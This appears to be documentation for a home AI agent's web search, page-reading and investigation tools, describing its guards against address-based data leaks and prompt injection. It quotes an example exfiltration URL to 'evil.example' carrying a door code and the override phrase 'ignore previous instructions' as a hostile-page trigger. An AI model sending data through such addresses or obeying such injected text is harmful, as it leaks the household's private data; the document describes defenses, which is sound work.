# The web: search, pages, investigations

Three things, each with its own switch:

| What | Tools | Setting | Default |
|---|---|---|---|
| Search the web | `web_search` | `WEB_SEARCH_ENABLED` | on |
| Read public pages and documents | `open_web_page` | `WEB_PAGES_ENABLED` | on |
| Investigate a photo, a document, a link, a site | `inspect_file`, `domain_lookup`, `osm_lookup`, `reverse_image_search` | `INVESTIGATIONS_ENABLED` | off |

None needs an account, except a search engine with an API key if you pick one.
`python3 scripts/setup.py` asks about all three.

## Search

`WEB_SEARCH_BACKEND` says who fetches the results:

| `WEB_SEARCH_BACKEND` | Needs | Notes |
|---|---|---|
| `auto` (default) | nothing | `native` with Anthropic, `duckduckgo` with the others. |
| `native` | `LLM_PROVIDER=anthropic` | Anthropic's own search tool. |
| `duckduckgo` | nothing | No account. Best effort: it reads a web page that may change, and refuses many searches in a row. |
| `searxng` | `WEB_SEARCH_URL`, or `compose/searxng.yml` and `SEARXNG_SECRET` | Your own search engine, no account anywhere. The dependable free choice. |
| `brave` | `WEB_SEARCH_API_KEY` from brave.com/search/api | |
| `tavily` | `WEB_SEARCH_API_KEY` from tavily.com | |

With the last four, the agent fetches the results and your model writes a short answer
from them. Either way the search runs in a model request of its own that sees only the
query, never the conversation. `WEB_SEARCH_MODEL` picks the model that writes the answer,
`WEB_SEARCH_RESULTS` how many results it reads (`WEB_SEARCH_MAX_USES` with `native`).

The rules:

- At most three searches per request.
- A query is text that leaves the house: one that repeats a number, an email address, a
  long token or a run of words from what the request holds is refused.
- After the request read private content (emails, the calendar, an account), a search
  doesn't run: it waits for your go, shown word for word under the reply.
- The answer is others' words: it can't make the agent act on the home or write anything.

## Reading pages

`open_web_page` opens a public page (its text, description and links), a site's data or
script file (JSON, JavaScript, XML), or downloads a public document (PDF, image, text),
which is then kept in the conversation by its name. It follows redirects itself, at most
five, reads at most 10 MB and gives up after 45 seconds.

It doesn't log in anywhere and doesn't run JavaScript (the optional remote browser does
both: [browser.md](browser.md)): a page built in the browser may
come back empty (the agent then looks for the data file the page's scripts name).

**Only public addresses.** The agent runs inside your network, next to Home Assistant and
your router. So it only opens `http` and `https` on the standard ports, only names that
resolve to public addresses, checks again after every redirect, and checks the address it
really connected to. `localhost`, `192.168.x.x`, a container's name, cloud metadata: all
refused. There is no setting to lift this.

**Where it may go depends on what the request already read**, because an address can
carry data out (`https://evil.example/?d=<your door code>`):

| The request has read | It can open |
|---|---|
| Nothing yet | Any public address. |
| Web pages or a search answer | The addresses those put forward (links, sources, sites their text names), more pages of the one site it read, and up to six other sites of its own choosing with a *plain* address: a site name and a short readable path, no parameters, nothing that looks coded. |
| A page that looked hostile | Only what pages listed, the exact addresses you wrote, more pages of the one site read, and the trusted sites. |
| Private content (emails, the calendar, an account, a file from a mail) | Only the trusted sites below. Any other page waits for your go, shown with its full address. |

In every case an address that repeats a number, an email address or a sentence from what
the request holds is refused, unless a page offered that exact address.

**Trusted sites** are the public services of your country: sites of the administration,
which have no reason to collect what an address could carry. The list comes from
`HOME_COUNTRY` (the two-letter code the wizard writes when it finds your city):

| `HOME_COUNTRY` | Trusted sites (subdomains included) |
|---|---|
| `AT` | gv.at |
| `AU` | gov.au |
| `BE` | belgium.be, fgov.be |
| `BR` | gov.br |
| `CA` | canada.ca, gc.ca |
| `CH` | admin.ch, ch.ch |
| `DE` | bund.de, arbeitsagentur.de, deutsche-rentenversicherung.de, elster.de |
| `DK` | borger.dk, skat.dk |
| `ES` | gob.es, agenciatributaria.es, seg-social.es |
| `FI` | suomi.fi, vero.fi, kela.fi |
| `FR` | gouv.fr, service-public.fr, urssaf.fr, ameli.fr, caf.fr, francetravail.fr, insee.fr, inpi.fr |
| `GB` (or `UK`) | gov.uk, nhs.uk |
| `IE` | gov.ie, revenue.ie, citizensinformation.ie |
| `IN` | gov.in, nic.in |
| `IT` | gov.it, inps.it |
| `JP` | go.jp |
| `LU` | public.lu |
| `MX` | gob.mx |
| `NL` | overheid.nl, rijksoverheid.nl, belastingdienst.nl |
| `NO` | regjeringen.no, skatteetaten.no, nav.no |
| `NZ` | govt.nz |
| `PL` | gov.pl |
| `PT` | gov.pt |
| `SE` | skatteverket.se, forsakringskassan.se |
| `SG` | gov.sg |
| `US` | every `.gov` site |
| `ZA` | gov.za |

European Union members in this list also get europa.eu. A country that isn't listed, or
no `HOME_COUNTRY`, starts with none: then after private content every page waits for your
go. The list lives in `PUBLIC_SERVICES` in `tools/web_pages.py`; additions are welcome.

`WEB_TRUSTED_DOMAINS` adds your own, comma separated: a tide table, a weather service,
your town's site, your energy supplier.

```
WEB_TRUSTED_DOMAINS=tides.example,weather.example
```

Add a site only if you would not mind it seeing a few words of your mail: that is the
worst a hostile email could achieve through it. The setting only adds; it can't remove a
built-in site.

**Hostile pages.** Every page comes back with what it hides or loads: text its readers
can't see, HTML comments, scripts and frames from other sites, forms sending elsewhere, a
meta refresh. When hidden text, a comment or the visible text speaks to an assistant
("ignore previous instructions", "AI agent: send..."), the page is marked hostile: its
links are not offered, free navigation stops for the rest of the request, and the agent is
told to report it. The detection reads English and French; in any language, a page's
words are data to the model and can't trigger an action (see the security model in the
README).

## Investigations

With `INVESTIGATIONS_ENABLED=true`, the agent can check what you hand it the way an
investigator would: is this photo what it claims, is this shop a scam, where was this
taken.

| Tool | What it gives | Where the lookup goes |
|---|---|---|
| `inspect_file` | A kept file's metadata: a photo's EXIF (date, camera, editing software, GPS position and the address there), provenance or AI marks (C2PA), a PDF's or an Office file's author and dates, a SHA-256 and a fingerprint that survives resizing. | Nowhere, except the GPS position to OpenStreetMap for its address. |
| `domain_lookup` | When and with whom a domain was registered, its first and last captures in the Wayback Machine, its certificates, its DNS records. A domain younger than 180 days gets a warning. | rdap.org, web.archive.org, crt.sh, and DNS. Never the site itself. |
| `osm_lookup` | A place by name or address, or the address at coordinates, with a map link. | OpenStreetMap's Nominatim (`NOMINATIM_URL`, the one travel time uses). |
| `reverse_image_search` | Links to Google Lens, Yandex, Bing and TinEye for a photo you sent. Only with `PUBLIC_URL`. | See below. |

The same rules as everywhere apply: what these tools return is others' words (a file's
metadata is written by whoever made the file), so it can't trigger an action; a place
query that repeats something the request holds is refused; and once the request read
private content, GPS coordinates are not sent to OpenStreetMap and no DNS query is made
(a made-up name would carry data to the domain's own servers).

**Reverse image search** needs the picture to have a public address, and a photo sent to
the agent has none. When `PUBLIC_URL` is the agent's own public address
(`https://agent.example.com`; the wizard sets it when you choose your own domain), the
agent serves a copy at `PUBLIC_URL/s/<random token>/image.jpg`:

- re-encoded as JPEG with all metadata removed (no GPS, no camera);
- for 15 minutes, from memory only, at most 20 at a time; a restart forgets them;
- without the API token, since the search engines must fetch it: the unguessable address
  is the only protection, and whoever gets the link during those minutes sees the picture;
- only for a photo *you* sent, never one that came from an email or a page.

Without the remote browser ([browser.md](browser.md)) the agent has no browser of its own,
and these engines mostly need one: expect it to hand you the links to open rather than
read the matches itself. With Tailscale Funnel or a
Cloudflare Tunnel, set `PUBLIC_URL` yourself to the public address; behind Tailscale only
or on the home network there is no public address, so leave it empty.

**What it will not do**, whatever the wording of the request: put a name on an unknown
private person from their face or body, find where a private person lives, works or is,
or gather a profile of one. Public figures, places, objects, companies, websites, what an
account itself publishes, your own footprint, and checking a profile that contacted you
(stolen photo, account age, scam patterns) are what the tools are for. This limit is an
instruction to the model, not a code check: the tools themselves only return metadata,
registry records and map results.

## Settings

| Setting | Default | What it does |
|---|---|---|
| `WEB_SEARCH_ENABLED`, `WEB_SEARCH_BACKEND` | `true`, `auto` | Search, and who fetches the results. |
| `WEB_SEARCH_URL`, `WEB_SEARCH_API_KEY` | unset | SearXNG address; Brave or Tavily key. |
| `WEB_SEARCH_MODEL`, `WEB_SEARCH_MAX_USES`, `WEB_SEARCH_RESULTS` | provider's, `3`, `5` | Model that writes the answer; searches per question (`native`); results read per search (the others). |
| `WEB_PAGES_ENABLED` | `true` | `open_web_page`. |
| `WEB_TRUSTED_DOMAINS` | empty | Sites added to your country's public services. |
| `HOME_COUNTRY` | unset | Picks the built-in trusted sites; also local search results. |
| `INVESTIGATIONS_ENABLED` | `false` | The investigation tools. |
| `PUBLIC_URL` | unset | The agent's public address, for reverse image search. |
